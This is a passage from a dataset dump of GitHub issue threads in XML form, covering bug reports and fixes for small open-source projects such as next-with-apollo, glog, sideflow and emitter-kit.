                    if (loading) return &lt;Loader_Component /&gt;&#13;
                    if (data) return Render_edit(data)&#13;
                }}&#13;
&lt;/Query&gt;`</Body>
    <State>open</State>
    <Comment>
      <Owner>lfades</Owner>
      <Body>@shipcake I'm not sure I follow, can you give me more details ? a reproduction can help, does the second page works by itself with a page refresh without a navigation ?</Body>
    </Comment>
  </Issue_647>
  <Issue_648>
    <Repository>next-with-apollo</Repository>
    <Title>SSR fails when graphql query throw Error</Title>
    <Owner>lfades</Owner>
    <Body>Hello,&#13;
I have a problem with throwing errors by graphql (in my case with authorization).&#160; I want to throw an Error when the user is not logged in. However, in this case, SSR doesn't work. "Loading ..." appears on the client's side, then the following message appears: "Network error: Can not read property 'req' of undefined".&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>lfades</Owner>
      <Body>@mzygmunt GraphQL errrors in SSR are ignored to avoid the page from crashing, but this error `Network error: Can not read property 'req' of undefined` should not be happening.</Body>
    </Comment>
    <Comment>
      <Owner>mzygmunt</Owner>
      <Body>So, is there any way for GraphQL errors to be passed to a component that handles them correctly? In my case, the point is for the error not to be ignored and not to crush the SSR, only to be passed to a component that will be rendered on the server side with a specific error message.</Body>
    </Comment>
    <Comment>
      <Owner>lfades</Owner>
      <Body>@mzygmunt A `onError` callback can be added for it, I didn't before because usually the error contains no useful information, Idk if that has changed. `getDataFromTree` runs all the queries it finds and fails if any query fails but the error thrown is not every useful (at least not when I checked), let me know if you think I'm wrong.&#13;
&#13;
Also the  `onError` link from Apollo should be a solution for this but afaik it's completely ignored by `getDataFromTree`</Body>
    </Comment>
    <Comment>
      <Owner>aequasi</Owner>
      <Body>~~I'm also getting the `Cannot read property 'req' of undefined` error. Not a network error though~~&#13;
 User error. Ignore me. Was wrapping a page with withApollo as well.</Body>
    </Comment>
  </Issue_648>
  <Issue_649>
    <Repository>react-es7-snippets</Repository>
    <Title>Duplicate key warning.</Title>
    <Owner>ngthorg</Owner>
    <Body>Every new window opened has the error message in a red/pink window:&#13;
&#13;
Failed to load snippets from '/Users/samsteele 1/.atom/packages/react-es7-snippets/snippets/React (ES7).cson'&#13;
&#13;
/Users/samsteele 1/.atom/packages/react-es7-snippets/snippets/React (ES7).cson: Duplicate key 'React ES7 Component'&#13;
&#13;
Have you seen this yet? Do you know of a quick fix? &#13;
&#13;
I uninstalled and reinstalled the package. It did not fix the issue.</Body>
    <State>open</State>
    <Comment>
      <Owner>jfluhmann82</Owner>
      <Body>@SamSteele01 &#13;
I had the same issue just while ago too.  Here is how I fixed it (you need to edit two lines of the .cson file):&#13;
Edit line 49 of the .cson file you listed in your question from 'React ES7 Component' to 'React ES7 Component with Props'&#13;
and Edit line 95 of the .cson file you listed in your question from 'React ES7 Component with Constructor' to 'React ES7 Components with Constructor and Props'&#13;
That will fix your dupe issue.</Body>
    </Comment>
    <Comment>
      <Owner>SamSteele01</Owner>
      <Body>That worked. Thank you!</Body>
    </Comment>
    <Comment>
      <Owner>karinafarina</Owner>
      <Body>I'm having same issue. How do I get to that file?</Body>
    </Comment>
    <Comment>
      <Owner>jfluhmann82</Owner>
      <Body>@karinafarina, the file is located at ~/.atom/packages/react-es7-snippets/snippets/React (ES7).cson&#13;
~/ is short for your home directory (i.e. ~/ == /home/jfluhmann/ or /Users/jfluhmann/ depending on OS you're on).&#13;
</Body>
    </Comment>
  </Issue_649>
  <Issue_650>
    <Repository>bbplayer</Repository>
    <Title>Auto-fill album &amp; artist labels</Title>
    <Owner>73rhodes</Owner>
    <Body>The album &amp; artist labels in the default style don't auto-populate; they should.
</Body>
    <State>open</State>
    <Comment>
      <Owner>wboykinm</Owner>
      <Body>@darrenderidder This is [harder than it looks](http://stackoverflow.com/questions/19047419/get-id3-tag-from-html5-audio-tag), unfortunately. Seems to require some server intervention.
</Body>
    </Comment>
    <Comment>
      <Owner>73rhodes</Owner>
      <Body>Been a while since I looked at this... I'll take another peek
</Body>
    </Comment>
  </Issue_650>
  <Issue_651>
    <Repository>bbplayer</Repository>
    <Title>Volume control for bbplayer</Title>
    <Owner>73rhodes</Owner>
    <Body>Darren
Nice html5audio player....thanks
Is it possible to add volume control?
Is it possible to add track list?
</Body>
    <State>open</State>
    <Comment>
      <Owner>darrenderidder</Owner>
      <Body>Hi Richard, my goal was to create a simple player without extras. A volume
control would be very easy to add, and a track list is do-able, so I may
look into adding those as optional controls if there's enough interest.
Thanks for trying out the player.

On Sun, May 5, 2013 at 1:16 PM, Richard Dickinson
notifications@github.comwrote:

&gt; Darren
&gt; Nice html5audio player....thanks
&gt; Is it possible to add volume control?
&gt; Is it possible to add track list?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHubhttps://github.com/darrenderidder/bbplayer/issues/1
&gt; .
</Body>
    </Comment>
    <Comment>
      <Owner>ultrabr</Owner>
      <Body>I really like your player. Can you please send me as I do in the script to insert a volume control button, I need it ! One Example.  Thanks.
</Body>
    </Comment>
  </Issue_651>
  <Issue_652>
    <Repository>node-opentoken</Repository>
    <Title>Error when decrypting </Title>
    <Owner>73rhodes</Owner>
    <Body>I was getting this error: &#13;
&#13;
`error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt `&#13;
&#13;
There was some suggestion to add `decipher.setAutoPadding(false)` after calling `crypto.createDecipheriv()` but now I get a different error: &#13;
&#13;
```&#13;
Error: incorrect header check&#13;
    at Zlib.zlibOnError [as onerror] (zlib.js:154:17) errno: -3, code: 'Z_DATA_ERROR'&#13;
```&#13;
&#13;
The token is working fine in the PHP version of this system, which is being ported across to nodejs/Express </Body>
    <State>open</State>
    <Comment>
      <Owner>73rhodes</Owner>
      <Body>Can you provide enough info / attachments to reproduce the issue? Just make sure not to include anything private / secret.</Body>
    </Comment>
    <Comment>
      <Owner>ToNyOyO</Owner>
      <Body>It's for a multinational's corporate login system, so I can't really give you anything to test. Any suggestions for something I can provide? &#13;
&#13;
I'm using cipherId=2 and have tried these suggested changes (in token.js)... &#13;
&#13;
```&#13;
222: decipher.setAutoPadding(false); &#13;
223: decipher.update(payloadCipherText, 'binary'); &#13;
```&#13;
&#13;
If line 222 is set as true I get this error instead: &#13;
&#13;
&gt; error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt&#13;
&#13;
It seems to be able to parse its own token but can't parse mine. There was a suggestion that the key must be wrong but the details I'm using are taken from a working PHP system. </Body>
    </Comment>
    <Comment>
      <Owner>73rhodes</Owner>
      <Body>I&#8217;ll try to reproduce it. If you have like a throw away token that can cause the error to manifest, that&#8217;d be good.</Body>
    </Comment>
    <Comment>
      <Owner>ToNyOyO</Owner>
      <Body>&gt; I&#8217;ll try to reproduce it. If you have like a throw away token that can cause the error to manifest, that&#8217;d be good.&#13;
&#13;
This is the configuration file from the PHP version: &#13;
&#13;
use-verbose-error-messages=false&#13;
cookie-path=/&#13;
cipher-suite=2&#13;
obfuscate-password=false&#13;
token-notbefore-tolerance=600&#13;
token-renewuntil=43200&#13;
use-sunjce=false&#13;
password=XXXXXXXXXXXXX&#13;
token-name=opentoken&#13;
token-lifetime=300&#13;
use-cookie=false&#13;
&#13;
I don't know if any of that helps (obviously I've redacted the password)? According to a comment in one of the PHP files it's using a "PingIdentity SSO". </Body>
    </Comment>
    <Comment>
      <Owner>73rhodes</Owner>
      <Body>Take a look at the tests. What I'd need basically is the parameters to replicate the failure path in a test. If you can fork this repo and create a test that demonstrates the failure path, that would go a long way towards getting this fixed. I no longer use this library myself, and while I'm happy to fix issues that are well defined, the problem needs to be clearly demonstrated with a complete list of steps to reproduce.</Body>
    </Comment>
    <Comment>
      <Owner>ToNyOyO</Owner>
      <Body>Don't hate me... but I've just discovered the issue. The password that's documented, and as far as I could see was being used, is totally not the actual password that's being used to decrypt the token. &#13;
&#13;
So your code is absolutely fine. &#13;
&#13;
[facepalm] </Body>
    </Comment>
  </Issue_652>
  <Issue_653>
    <Repository>node-python</Repository>
    <Title>demarcation strings could collide with regular output</Title>
    <Owner>73rhodes</Owner>
    <Body>Since the stderr &gt;&gt;&gt; prompt didn't work very well to demarcate command responses, I added a header and footer to the command response, which are just "COMMAND START" and "COMMAND END".  Which is pretty lame because these strings could appear somewhere in the normal output.  Making them more unique and making the regex test that looks for them a little more explicit would be better.
</Body>
    <State>open</State>
    <Comment>
      <Owner>mk-pmb</Owner>
      <Body>Would MIME-style boundaries solve it?
</Body>
    </Comment>
    <Comment>
      <Owner>darrenderidder</Owner>
      <Body>Something like that. The solution I had in mind is just to use a random string instead of a hard-coded one; I briefly looked into generating UUID's, but now consider that to be overkill.
</Body>
    </Comment>
  </Issue_653>
  <Issue_654>
    <Repository>sideflow</Repository>
    <Title>Port sideflow.js to also support Maven Selenium Plugin's selenese goal</Title>
    <Owner>73rhodes</Owner>
    <Body>When the sideflow.js is added to the user-extensions.js for the Selenium Maven Plugin to run the Selenese HTML test suit, the script breaks inside initialiseLabels() as the testCase is not defined in this environment.

For Selenium Maven Plugin documentation see:
http://mojo.codehaus.org/selenium-maven-plugin/selenese-mojo.html

A code snippet I've been using in my POM:

```
...
&lt;plugin&gt;
    &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;
    &lt;artifactId&gt;selenium-maven-plugin&lt;/artifactId&gt;
    &lt;version&gt;${maven.selenium.plugin.version}&lt;/version&gt;
    &lt;configuration&gt;
        &lt;userExtensions&gt;src/test/selenium/user-extensions.js&lt;/userExtensions&gt;
        &lt;browser&gt;*firefox&lt;/browser&gt;
        &lt;startURL&gt;http://localhost:${maven.tomcat.port}&lt;/startURL&gt;
        &lt;suite&gt;${basedir}/target/test-classes/selenium/DesktopTests.html&lt;/suite&gt;
    &lt;/configuration&gt;
    &lt;executions&gt;
        &lt;!-- Sanity tests and also screenshots --&gt;
        &lt;execution&gt;
            &lt;id&gt;run-selenium-tests-ff-desktop-sanity&lt;/id&gt;
            &lt;phase&gt;integration-test&lt;/phase&gt;
            &lt;configuration&gt;
                &lt;browser&gt;*firefox&lt;/browser&gt;
                &lt;multiWindow&gt;true&lt;/multiWindow&gt;
                &lt;port&gt;${maven.selenium.plugin.port}&lt;/port&gt;
                &lt;startURL&gt;http://localhost:${maven.tomcat.port}&lt;/startURL&gt;
                &lt;suite&gt;${basedir}/target/test-classes/selenium/DesktopScreenshots.html&lt;/suite&gt;
                &lt;results&gt;${basedir}/target/selenium/results-firefox-desktop-screenshots-TestSuite.html&lt;/results&gt;
            &lt;/configuration&gt;
            &lt;goals&gt;
                &lt;goal&gt;selenese&lt;/goal&gt;
            &lt;/goals&gt;
        &lt;/execution&gt;
        ...
     &lt;/executions&gt;
&lt;/plugin&gt;
...
```

I'm researching into a fix and will provide a PR if I find out...
</Body>
    <State>open</State>
    <Comment>
      <Owner>paulbors</Owner>
      <Body>So  the problem here is that this script is written to work only for the Selenium IDE and not the Selenium RC. Good news is that it can be modified to work under both run-times environments and I'm in the middle of it.

As it turns out the script is a bit old too and is still accessing the deprecated testCase variable of the Slenium IDE window instead of invoking Application.prototype.getTestCase(). I'll fix that as well...
</Body>
    </Comment>
    <Comment>
      <Owner>paulbors</Owner>
      <Body>So far so good... I was able to implement the loop that initializes that custom commands inside Selenium.prototype.initialiseLabels() for Selenium RC. It will end up looking something like:

```
// Some utils to simplify life...
var sideflowJsUtils = {};
sideflowJsUtils.isIDE = (Application.prototype != undefined);
sideflowJsUtils.getTestCase = function() {
    if(sideflowJsUtils.isIDE) {
        return Application.prototype.getTestCase();
    }
    return testFrame.getCurrentTestCase();
};
sideflowJsUtils.getCommands = function() {
    var seleniumCommands;
    if(sideflowJsUtils.isIDE) {
        seleniumCommands = sideflowJsUtils.getTestCase().commands;
    } else {
        seleniumCommands = sideflowJsUtils.getTestCase().commandRows;
    }
    return seleniumCommands;
};

Selenium.prototype.initialiseLabels = function() {
    ...
    // For all active test commands in Selenium RC
    var command = command_rows[i].trElement.cells[0].innerHTML;
    var target = command_rows[i].trElement.cells[1].innerHTML;
    var value = command_rows[i].trElement.cells[2].innerHTML;
    switch (command.toLowerCase()) {
        case "label":
            gotoLabels[ target ] = i;
            break;
        case "while":
        case "endwhile":
            cycles.push([command.toLowerCase(), i]);
            break;
        case "foreach":
        case "endforeach":
            forEachCmds.push([command.toLowerCase(), i]);
            break;
    }
    ...
}
```

That's tested and working now is time to move on to implementing the commands themselves.

I see the extensive use of testCase.debugContext.debugIndex but the TestCase object is not available in Selenium RC so this might end up having to be forked inside an if as well and implemented in a second different way too to support Selenium RC and its Selenese scripts. That's for tomorrow...
</Body>
    </Comment>
    <Comment>
      <Owner>paulbors</Owner>
      <Body>I ended up refactoring most of the script and implemented the OOP Selenium's way.

I have tested it given your demos and my own scripts in both the Selenium IDE and Maven Selenium Plugin.

Feel free to test and accept the PR at your leisure.
</Body>
    </Comment>
  </Issue_654>
  <Issue_655>
    <Repository>sideflow</Repository>
    <Title>Refactor the script to use OOP via Selenium's API and port it over to support the selenese target of the Maven Selenium Plugin</Title>
    <Owner>73rhodes</Owner>
    <Body>Instead of overwriting (not overloading) Selenium&#8217;s reset() function,
it&#8217;s better to use the proxy design pattern so that if the original
function changes we won&#8217;t break Selenium IDE&#8217;s init code by still using
an outdated cut-n-paste ver of the impl

Cleaned up some of the code by removing white spaces and adding semicolons to all of the functions
</Body>
    <State>open</State>
    <Comment>
      <Owner>paulbors</Owner>
      <Body>Okay, this PR should be ready now.

I tested the while loops in both the IDE and Selenium Maven Plugin for the selenese target.
</Body>
    </Comment>
  </Issue_655>
  <Issue_656>
    <Repository>google-maps-cluster</Repository>
    <Title>Please give small complete example in meteor </Title>
    <Owner>JoshDellay</Owner>
    <Body>small example will add value for beginners . 
</Body>
    <State>open</State>
    <Comment>
      <Owner>JoshDellay</Owner>
      <Body>I am pretty busy currently but I will try to get to this as soon as possible.  I also have a few things I need to fix in this package, thanks for the reminder ;)
</Body>
    </Comment>
    <Comment>
      <Owner>allpratik</Owner>
      <Body>@JoshDellay Did you post anywhere a sample example about this package?
 Definitely would love to use it.
</Body>
    </Comment>
    <Comment>
      <Owner>caprianik</Owner>
      <Body>@JoshDellay Can u post basic example about this package. It would be very useful.
</Body>
    </Comment>
  </Issue_656>
  <Issue_657>
    <Repository>google-glog</Repository>
    <Title>Trying to use glog on windows results undefined references</Title>
    <Owner>baysao</Owner>
    <Body>I am trying glog. I have downloaded last version (0.3.5)&#13;
&#13;
I try to compile with cmake.&#13;
&#13;
What I have done is:&#13;
&#13;
- I have compiled as static library with options `BUILD_TESTING = OFF` and `WITH_GFLAGS = OFF` and used libglog.a perfectly on linux &#13;
&#13;
- Now I try on windows. I have compiled glog with same options as static library:&#13;
    &#13;
```&#13;
        [ 11%] Building CXX object CMakeFiles/glog.dir/src/demangle.cc.obj&#13;
        [ 22%] Building CXX object CMakeFiles/glog.dir/src/logging.cc.obj&#13;
        [ 33%] Building CXX object CMakeFiles/glog.dir/src/raw_logging.cc.obj&#13;
        [ 44%] Building CXX object CMakeFiles/glog.dir/src/symbolize.cc.obj&#13;
        [ 55%] Building CXX object CMakeFiles/glog.dir/src/utilities.cc.obj&#13;
        [ 66%] Building CXX object CMakeFiles/glog.dir/src/vlog_is_on.cc.obj&#13;
        [ 77%] Building CXX object CMakeFiles/glog.dir/src/signalhandler.cc.obj&#13;
        [ 88%] Building CXX object CMakeFiles/glog.dir/src/windows/port.cc.obj&#13;
        [100%] Linking CXX static library libglogd.a&#13;
        [100%] Built target glog&#13;
```&#13;
&#13;
- Then, when i try to use it in a project (executable) including libglogd.a just like in linux, I got these exceptions of linking when compiling executable:&#13;
&#13;
        undefined reference to `_imp___ZN6google17InitGoogleLoggingEPKc'&#13;
        undefined reference to `_imp___ZN6google10LogMessageC1EPKci'&#13;
        undefined reference to `_imp___ZN6google10LogMessage6streamEv'&#13;
        undefined reference to `_imp___ZN6google10LogMessageD1Ev'&#13;
        undefined reference to `_imp___ZN6google10LogMessageC1EPKcii'&#13;
        undefined reference to `_imp___ZN6google10LogMessage6streamEv'&#13;
        undefined reference to `_imp___ZN6google10LogMessageD1Ev'&#13;
        undefined reference to `_imp___ZN6google10LogMessageD1Ev'&#13;
        undefined reference to `_imp___ZN6google10LogMessageD1Ev'&#13;
&#13;
- I could not find any further info about this.&#13;
&#13;
Here is CMakeLists.txt of executable:&#13;
&#13;
    project(exe)&#13;
    cmake_minimum_required(VERSION 2.8)&#13;
    aux_source_directory(. SRC_LIST)&#13;
    &#13;
    #Ignore QT specified variables&#13;
    set(ignoreMe "${QT_QMAKE_EXECUTABLE}")&#13;
    &#13;
    #set(HEADERS foo.h)&#13;
&#13;
    add_executable(${PROJECT_NAME} ${SRC_LIST})&#13;
    &#13;
    if (!WIN32)&#13;
        target_include_directories(${PROJECT_NAME} PUBLIC&#13;
            /home/glog-master/trunk/build/linux/Debug&#13;
            /home/glog-master/trunk/src&#13;
            $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;&#13;
            $&lt;INSTALL_INTERFACE:include/${PROJECT_NAME}&gt;)&#13;
&#13;
        target_link_libraries(${PROJECT_NAME} /home/glog-master/trunk/build/linux/Debug/libglogd.a)&#13;
    else()&#13;
        target_include_directories(${PROJECT_NAME} PUBLIC&#13;
            D:/glog-master/trunk/build/windows/Debug&#13;
            D:/glog-master/trunk/src&#13;
            $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;&#13;
            $&lt;INSTALL_INTERFACE:include/${PROJECT_NAME}&gt;)&#13;
    &#13;
        target_link_libraries(${PROJECT_NAME} D:/glog-master/trunk/build/windows/Debug/libglogd.a)&#13;
    endif()&#13;
&#13;
And here is the only file of executable, main.cpp:&#13;
&#13;
    #include &lt;iostream&gt;&#13;
    #include "glog/logging.h"&#13;
    &#13;
    using namespace std;&#13;
    &#13;
    int main() {&#13;
    &#13;
        google::InitGoogleLogging("MYEXE");&#13;
    &#13;
        LOG(INFO) &lt;&lt; "This is an info  message MAIN";&#13;
        LOG(WARNING) &lt;&lt; "This is a warning message MAIN";&#13;
    &#13;
        return 0;&#13;
    }&#13;
&#13;
What do I miss in windows?</Body>
    <State>open</State>
    <Comment>
      <Owner>emnkoksal</Owner>
      <Body>When I look to the library .a, I see symbols like __ZN6google10LogMessageD1Ev. So, "_imp" is surplus. Where does it come? I do not have dllimport.</Body>
    </Comment>
    <Comment>
      <Owner>GhostRiderLi</Owner>
      <Body>&gt; When I look to the library .a, I see symbols like __ZN6google10LogMessageD1Ev. So, "_imp" is surplus. Where does it come? I do not have dllimport.&#13;
&#13;
Guy&#65292;did you work it out? I got same problem.</Body>
    </Comment>
    <Comment>
      <Owner>emnkoksal</Owner>
      <Body>&gt; &gt; When I look to the library .a, I see symbols like __ZN6google10LogMessageD1Ev. So, "_imp" is surplus. Where does it come? I do not have dllimport.&#13;
&gt; &#13;
&gt; Guy&#65292;did you work it out? I got same problem.&#13;
&#13;
@GhostRiderLi Yes. Try to add glog::glog and dbghelp as target link library.&#13;
Example for cmake:&#13;
&#13;
target_link_libraries(${PROJECT_NAME} glog::glog)&#13;
target_link_libraries(${PROJECT_NAME} dbghelp)</Body>
    </Comment>
  </Issue_657>
  <Issue_658>
    <Repository>elm_phoenix</Repository>
    <Title>Issue with node-elm-compiler/index.js:103</Title>
    <Owner>humberaquino</Owner>
    <Body>I ran into an issue where I received this error when following the tutorial in my own project and attempting to run `mix phx.server`:&#13;
&#13;
```&#13;
/assets/node_modules/node-elm-compiler/index.js:103&#13;
      .on('error', function(err) { throw(err); });&#13;
&#13;
Error: spawn elm ENOENT&#13;
```&#13;
&#13;
Adding the following path to Elm in my web pack config resolved the issue.&#13;
&#13;
```&#13;
[...]&#13;
options: {&#13;
  debug: options.mode === "development",&#13;
  pathToElm: './node_modules/.bin/elm'&#13;
}&#13;
[...]&#13;
```&#13;
&#13;
Posting in case others run into the same issue.</Body>
    <State>open</State>
    <Comment>
      <Owner>MichaelDimmitt</Owner>
      <Body>@jamiedumont, another alternative. `npm install -g elm;`</Body>
    </Comment>
  </Issue_658>
  <Issue_659>
    <Repository>sailsjs-nodewebkit</Repository>
    <Title>Cannot extract package grunt-cli</Title>
    <Owner>alterx</Owner>
    <Body>Just out of curiosity have you come across the error Cannot extract package and in reference to the grunt-cli package, as I'm unable to get my sails app working with node webkit because of this.
</Body>
    <State>open</State>
    <Comment>
      <Owner>alterx</Owner>
      <Body>Hmmm, interesting. I've never had that issue. Are you using this repo as a base or just trying on another project? 
</Body>
    </Comment>
    <Comment>
      <Owner>dottodot</Owner>
      <Body>I'm was having the problem on my app, but I tried this repo and got the same error.
</Body>
    </Comment>
    <Comment>
      <Owner>alterx</Owner>
      <Body>Ok @dottodot , I'll look into it. Could you please provide some details about the steps to reproduce and the outcome you're getting?
</Body>
    </Comment>
    <Comment>
      <Owner>dottodot</Owner>
      <Body>OK I've tried on a fresh test app, replacing the app.js file with yours, adding the spash.hml, and adjusting the package.json. I've run sails lift just to check it works as expected and then I've used https://github.com/mllrsohn/node-webkit-builder i.e. nwbuild -r pathtoapp/

this then gives the error as per the image below

![screen shot 2015-01-29 at 10 00 20](https://cloud.githubusercontent.com/assets/811652/5955723/bfe6d0a8-a79d-11e4-9401-d1ccb0fbb707.png)

The app does also seem to load ok behind the error window.

However if I then build the app using gulp, when I open it I get no error but it just doesn't load and I get a white screen.

Hope that makes sense.
</Body>
    </Comment>
    <Comment>
      <Owner>alterx</Owner>
      <Body>Sure, as soon as I get home i'll see if I can replicate this. 
I'll keep you posted.
</Body>
    </Comment>
    <Comment>
      <Owner>alterx</Owner>
      <Body>Hey @dottodot , I've been really sick but I'm back into business. Couldn't really replicate your issue but I updated the code to work with the latest version on node-webkit (now called nwjs). Please let me know if you continue to have this issue. 
Also, are you working on a machine that has windows installed? 
If so, that might be it, you know that the node_modules folder tends to become HUGE.
</Body>
    </Comment>
    <Comment>
      <Owner>senica</Owner>
      <Body>Just wanted to report that the issue still exists. This is on OSX 10.9.1. Pretty much the same issue. I haven't looked into it yet, but if find something, I'll add a pull request.

![screen shot 2015-03-23 at 11 14 50 am](https://cloud.githubusercontent.com/assets/954952/6787162/3050e228-d14e-11e4-97b3-98db3969a45a.png)
</Body>
    </Comment>
    <Comment>
      <Owner>alterx</Owner>
      <Body>@senica I was able to replicate (finally!)
For some reason I was missing all the grunt config files in this repo, I added the missing files and the grunt error is gone for good.

Could you please confirm that my latest commit fixes the issue ? OSX 10.10 here
</Body>
    </Comment>
    <Comment>
      <Owner>senica</Owner>
      <Body>@alterx Issue still exists with commit a84ec3c0045521d3470553d7f0ef2c8a3e1865eb . I was first getting an error about pipeline.js missing. I added one in the tasks directory from another project and sails would run fine, but node-webkit still gave me the same error regarding grunt. 
</Body>
    </Comment>
    <Comment>
      <Owner>alterx</Owner>
      <Body>This is really weird @senica , I can't replicate it. Just cloned a fresh copy of the repo and ran it using 'nwbuild -r /sailsjs-webkit' with no issues. This on a Win7 machine @ work. Also, I ran it yesterday on my personal macbookpro, with no issues.

Both are running the latest versions of nw.js (it was renamed from node-webkit after they started using io.js) and nwbuilder [https://github.com/mllrsohn/node-webkit-builder]
</Body>
    </Comment>
    <Comment>
      <Owner>senica</Owner>
      <Body>That's a bummer. Well, I seriously doubt this is helpful in anyway but: https://youtu.be/9DJu0n_ar90
</Body>
    </Comment>
    <Comment>
      <Owner>alterx</Owner>
      <Body>I've been able to replicate again an tracked down the issue to the sails version in the package.json file.
Apparently the version provided ^0.10.5 was breaking the app. I replicated and suppressed the error by changing the version. I'll dig a bit more into it but updating to the latest version seems to fix the issue. 
</Body>
    </Comment>
  </Issue_659>
  <Issue_660>
    <Repository>cara</Repository>
    <Title>Take @import location into account</Title>
    <Owner>aleclarson</Owner>
    <Body>Currently, the CSS bundler always hoists `@import` statements to the top of the file. Instead, if CSS exists both above and below an `@import` statement, the bundler should split the parent module into two parts and insert the dependency between them. Similarly, if an `@import` statement is at the bottom of a file, avoid hoisting the dependency but don't split the parent unless necessary.</Body>
    <State>open</State>
    <Comment>
      <Owner>aleclarson</Owner>
      <Body>This requires some extra logic once we support plugins for CSS packages other than the entry package. For example, if one SCSS package imports from another SCSS package, we can safely merge before transforming into CSS. But if the imported package uses LESS, we need to transform&#13;
before inserting it into the bundle.</Body>
    </Comment>
  </Issue_660>
  <Issue_661>
    <Repository>ddp</Repository>
    <Title>Unable to Resolve Module SetImmediate</Title>
    <Owner>aleclarson</Owner>
    <Body>react native 0.20 give Unable to Resolve Module SetImmediate from meteor-client module when importing ddp.
</Body>
    <State>open</State>
    <Comment>
      <Owner>aleclarson</Owner>
      <Body>React Native 0.20+ still provides [`Libraries/vendor/core/setImmediate.js`](https://github.com/facebook/react-native/blob/0.20-stable/Libraries/vendor/core/setImmediate.js). Their packager resolves `require('setImmediate')` into that file. It works on my end, so not sure what to tell you.
</Body>
    </Comment>
  </Issue_661>
  <Issue_662>
    <Repository>emitter-kit</Repository>
    <Title>This application&#8217;s bundle identifier does not match its code signing identifier.</Title>
    <Owner>aleclarson</Owner>
    <Body>I installed the Library with Carthage 0.26.2&#13;
X-Code 9.0.1&#13;
Swift 3.2&#13;
&#13;
Simulator: no errors&#13;
Device: This application&#8217;s bundle identifier does not match its code signing identifier.&#13;
&#13;
If I remove the library all is working fine.&#13;
I can install other libraries with Carthage with no problems.&#13;
&#13;
Any help would be greatly appreciated!&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>aleclarson</Owner>
      <Body>Let me know if [this link](https://stackoverflow.com/a/34652134/2228559) helps you.</Body>
    </Comment>
    <Comment>
      <Owner>nm</Owner>
      <Body>Thx, I already tried that, but it doesn't make any difference.&#13;
&#13;
But when I download and build the framework manually it is working fine.&#13;
So it seems to be related to how carthage builds the framework.&#13;
&#13;
I found a similar issue here:&#13;
https://github.com/duemunk/Async/issues/109&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>etugadoWNG</Owner>
      <Body>@nm did you find a solution for this?</Body>
    </Comment>
    <Comment>
      <Owner>nm</Owner>
      <Body>No, I'm afraid not. &#13;
For now I build and include the library manually.</Body>
    </Comment>
  </Issue_662>
  <Issue_663>
    <Repository>emitter-kit</Repository>
    <Title>Notifier: NSObject</Title>
    <Owner>aleclarson</Owner>
    <Body>I think it's a good idea to make `Notifier` subclass of `NSObject`.&#13;
this way, developers can retain `Notifier` object with protocol extensions too. (using `objc_setAssociatedObject`) .&#13;
&#13;
I've described it here: http://stackoverflow.com/questions/38190702/how-to-use-objc-protocol-with-optional-and-extensions-at-the-same-time/42212943#42212943</Body>
    <State>open</State>
    <Comment>
      <Owner>aleclarson</Owner>
      <Body>Can you give me a simple use case, with example code? &#128077; &#13;
&#13;
Note: I'm not asking for implementation code, just how you expect to use the API.</Body>
    </Comment>
  </Issue_663>
  <Issue_664>
    <Repository>grunt-then</Repository>
    <Title>not up to date with latest grunt API</Title>
    <Owner>aleclarson</Owner>
    <Body>would love this to work, but the current API is grunt.task.run("taskname") and I cant get it to work with either:&#13;
&#13;
    grunt.task.run("taskname").then(() =&gt; { ... });&#13;
&#13;
or &#13;
&#13;
    grunt.run("taskname").then(() =&gt; { ... });&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>aleclarson</Owner>
      <Body>@flyon I don't currently use Grunt. If you can figure it out, I would gladly take a pull request. Sorry! </Body>
    </Comment>
  </Issue_664>
  <Issue_665>
    <Repository>hex-kit</Repository>
    <Title>Support ARGB</Title>
    <Owner>aleclarson</Owner>
    <Body>You could support hexadecimal alpha also (often used for Android so for cross-compatible palettes support would be useful). I wrote this a while back which shows a way to use just one `NSScanner` to get all four values in one go:

https://gist.github.com/blixt/821a0748257dc8d3581f
</Body>
    <State>open</State>
    <Comment>
      <Owner>aleclarson</Owner>
      <Body>Sounds great. Want to submit a PR?

I'm using React Native right now and have no need to maintain this library. :smile: 
</Body>
    </Comment>
  </Issue_665>
  <Issue_666>
    <Repository>daru-data_tables</Repository>
    <Title>LoadError: cannot load such file -- action_view on IRuby</Title>
    <Owner>Shekharrajak</Owner>
    <Body>Looks like this is a different issue, but related to #2. The issue is that it looks like there is code depending on Rails, that shouldn't be loaded when in IRuby.&#13;
&#13;
This is the error I get: &#13;
&#13;
```&#13;
LoadError: cannot load such file -- action_view&#13;
/Users/brodock/.rvm/gems/ruby-2.5.3/gems/daru-data_tables-0.3.5/lib/daru/data_tables/display/display.rb:5:in `require'&#13;
/Users/brodock/.rvm/gems/ruby-2.5.3/gems/daru-data_tables-0.3.5/lib/daru/data_tables/display/display.rb:5:in `&lt;top (required)&gt;'&#13;
/Users/brodock/.rvm/gems/ruby-2.5.3/gems/daru-data_tables-0.3.5/lib/daru/data_tables.rb:4:in `require'&#13;
/Users/brodock/.rvm/gems/ruby-2.5.3/gems/daru-data_tables-0.3.5/lib/daru/data_tables.rb:4:in `&lt;top (required)&gt;'&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>Shekharrajak</Owner>
      <Body>Sorry I missed this issue notification. It look like `action_view` gem is not installed in your system. PLease install using `gem install action_view`.</Body>
    </Comment>
  </Issue_666>
  <Issue_667>
    <Repository>daru_examples_io_view_rails</Repository>
    <Title>Load optional dependencies group from daru-io Gemfie</Title>
    <Owner>Shekharrajak</Owner>
    <Body>Currently, all IO related gems like `spreadsheet`, `jsonpath`, etc. are grouped under the `optional` group of [Gemfile](https://github.com/athityakumar/daru-io/blob/master/Gemfile). They were intended to be here and not in the gemspec file due to partial-requiring use-cases. Have a look at https://github.com/athityakumar/daru-io/issues/25 for more details.&#13;
&#13;
Rather than adding all these dependencies to this Rails app's Gemfile, would it be possible (and better) to add the gems from daru-io's Gemfile?&#13;
&#13;
Ping @Shekharrajak </Body>
    <State>open</State>
    <Comment>
      <Owner>Shekharrajak</Owner>
